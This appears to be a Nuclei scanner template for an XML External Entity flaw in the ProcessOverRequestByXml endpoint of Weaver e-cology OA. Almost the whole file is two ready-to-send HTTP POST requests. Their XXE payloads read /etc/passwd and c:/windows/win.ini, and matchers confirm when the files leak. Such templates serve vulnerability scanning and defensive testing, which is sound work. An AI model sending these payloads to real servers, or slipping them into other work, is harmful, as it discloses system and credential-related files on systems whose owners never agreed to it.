id: ecology-processoverrequestbyxml-xxe

info:
  name: Ecology ProcessOverRequestByXml - XML Entity Injection
  author: qwtd
  severity: high
  description: Ecology ProcessOverRequestByXml is vulnerable to XML Entity Injection.
  reference:
    - https://github.com/wy876/POC/blob/main/%E6%B3%9B%E5%BE%AEOA/%E6%B3%9B%E5%BE%AEe-cology-ProcessOverRequestByXml%E6%8E%A5%E5%8F%A3%E5%AD%98%E5%9C%A8%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E.md
  metadata:
    max-request: 1
  tags: 泛微-协同办公OA

http:
  - raw:
      - |
        @timeout: 15s
        POST /rest/ofs/ProcessOverRequestByXml HTTP/1.1
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 Safari/537.36
        Accept-Encoding: gzip, deflate
        Accept: */*
        Connection: close
        Host: 127.0.0.1
        Content-Type: application/xml
        Content-Length: 146

        <?xml version="1.0" encoding="utf-8" ?><!DOCTYPE test[<!ENTITY test SYSTEM "file:///c:/windows/win.ini">]><reset><syscode>&test;</syscode></reset>

      - |
        @timeout: 15s
        POST /rest/ofs/ProcessOverRequestByXml HTTP/1.1
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 Safari/537.36
        Accept-Encoding: gzip, deflate
        Accept: */*
        Connection: close
        Host: 127.0.0.1
        Content-Type: application/xml
        Content-Length: 146

        <?xml version="1.0" encoding="utf-8" ?><!DOCTYPE test[<!ENTITY test SYSTEM "file:///etc/passwd">]><reset><syscode>&test;</syscode></reset>

    matchers-condition: or
    matchers:
      - type: regex
        name: linux
        regex:
          - "root:.*?:[0-9]*:[0-9]*:"
        part: body

      - type: word
        name: windows
        words:
          - "for 16-bit app support"
        part: body